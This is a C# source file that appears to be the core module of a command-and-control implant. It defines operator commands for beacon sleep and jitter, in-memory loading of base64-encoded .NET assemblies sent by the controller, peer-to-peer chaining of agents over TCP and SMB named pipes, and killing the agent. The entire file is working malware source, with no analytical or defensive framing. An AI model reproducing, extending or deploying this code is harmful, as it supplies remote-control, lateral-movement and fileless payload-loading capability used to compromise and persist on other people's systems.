using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Common.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Agent.Modules
{
    class CoreAgentModule : IAgentModule
    {
        private AgentController Agent { get; set; }
        private ConfigController Config { get; set; }

        public void Init(AgentController agent, ConfigController config)
        {
            Agent = agent;
            Config = config;
        }

        public AgentModule GetModuleInfo()
        {
            return new AgentModule
            {
                Name = "core",
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "sleep",
                        Description = "Set the sleep interval and jitter",
                        HelpText = "sleep [interval] [jitter]",
                        CallBack = SetSleep
                    },
                    new AgentCommand
                    {
                        Name = "nop",
                        CallBack = NOP,
                        Visible = false
                    },
                    new AgentCommand
                    {
                        Name = "load-module",
                        Description = "Load an agent module",
                        HelpText = "load-module [path]",
                        CallBack = LoadAgentModule
                    },
                    new AgentCommand
                    {
                        Name = "link",
                        Description = "Link to a TCP agent",
                        HelpText = "link [target] [port]",
                        CallBack = LinkTcpAgent
                    },
                    new AgentCommand
                    {
                        Name = "unlink",
                        Description = "Unlink a TCP agent",
                        HelpText = "unlink [target]",
                        CallBack = UnlinkTcpAgent
                    },
                    new AgentCommand
                    {
                        Name = "connect",
                        Description = "Connect to an SMB agent",
                        HelpText = "connect [target] [pipename]",
                        CallBack = ConnectSmbAgent
                    },
                    new AgentCommand
                    {
                        Name = "disconnect",
                        Description = "Disconnect from an SMB agent",
                        HelpText = "disconnect [target]",
                        CallBack = DisconnectSmbAgent
                    },
                    new AgentCommand
                    {
                        Name = "exit",
                        Description = "Kill the agent",
                        HelpText = "exit",
                        CallBack = ExitAgent
                    }
                }
            };
        }

        private void LoadAgentModule(byte[] data)
        {
            try
            {
                var bytes = Convert.FromBase64String(Encoding.UTF8.GetString(data));
                var assembly = Assembly.Load(bytes);
                var module = assembly.CreateInstance("Agent.Module", true);

                if (module is IAgentModule == false)
                {
                    throw new Exception("Assembly is not IAgentModule");
                }

                var agentmodule = module as IAgentModule;

                Agent.RegisterAgentModule(agentmodule);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void NOP(byte[] data)
        {
            
        }

        private void ExitAgent(byte[] data)
        {
            Agent.AgentStatus = AgentStatus.Stopped;
        }

        private void SetSleep(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');

                if (split.Length >= 1 && !string.IsNullOrEmpty(split[0]))
                {
                    Config.SetOption(ConfigSetting.SleepInterval, split[0]);
                }

                if (split.Length >= 2 && !string.IsNullOrEmpty(split[1]))
                {
                    Config.SetOption(ConfigSetting.SleepJitter, split[1]);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void LinkTcpAgent(byte[] data)
        {
            var split = Encoding.UTF8.GetString(data).Split(' ');
            var hostname = split[0];
            var port = Convert.ToInt32(split[1]);

            var tcpClient = new TcpClientModule(hostname, port);
            tcpClient.Init(Config, Agent.Crypto);
            tcpClient.Start();

            Agent.TcpClients.Add(tcpClient);

            var message = new AgentMessage
            {
                IdempotencyKey = Guid.NewGuid().ToString(),
                Metadata = new AgentMetadata(),
                Data = new C2Data { Module = "link", Command = "link", Data = Encoding.UTF8.GetBytes((Config.GetOption(ConfigSetting.Metadata) as AgentMetadata).AgentID) }
            };

            tcpClient.SendData(message);
        }

        private void UnlinkTcpAgent(byte[] data)
        {
            var host = Encoding.UTF8.GetString(data);
            var tcpClient = Agent.TcpClients.FirstOrDefault(c => c.Hostname.Equals(host, StringComparison.OrdinalIgnoreCase));

            if (tcpClient != null)
            {
                tcpClient.Stop();
                Agent.TcpClients.Remove(tcpClient);
            }
            else
            {
                Agent.SendError("TCP agent not found");
            }
        }

        private void ConnectSmbAgent(byte[] data)
        {
            var split = Encoding.UTF8.GetString(data).Split(' ');
            var hostname = split[0];
            var pipename = split[1];

            var smbClient = new SmbClientModule(hostname, pipename);
            smbClient.Init(Config, Agent.Crypto);
            smbClient.Start();

            Agent.SmbClients.Add(smbClient);

            var message = new AgentMessage
            {
                IdempotencyKey = Guid.NewGuid().ToString(),
                Metadata = new AgentMetadata(),
                Data = new C2Data { Module = "connect", Command = "connect", Data = Encoding.UTF8.GetBytes((Config.GetOption(ConfigSetting.Metadata) as AgentMetadata).AgentID) }
            };

            smbClient.SendData(message);
        }

        private void DisconnectSmbAgent(byte[] data)
        {
            var host = Encoding.UTF8.GetString(data);
            var smbClient = Agent.SmbClients.FirstOrDefault(c => c.Hostname.Equals(host, StringComparison.OrdinalIgnoreCase));

            if (smbClient != null)
            {
                smbClient.Stop();
                Agent.SmbClients.Remove(smbClient);
            }
            else
            {
                Agent.SendError("SMB agent not found");
            }
        }
    }
}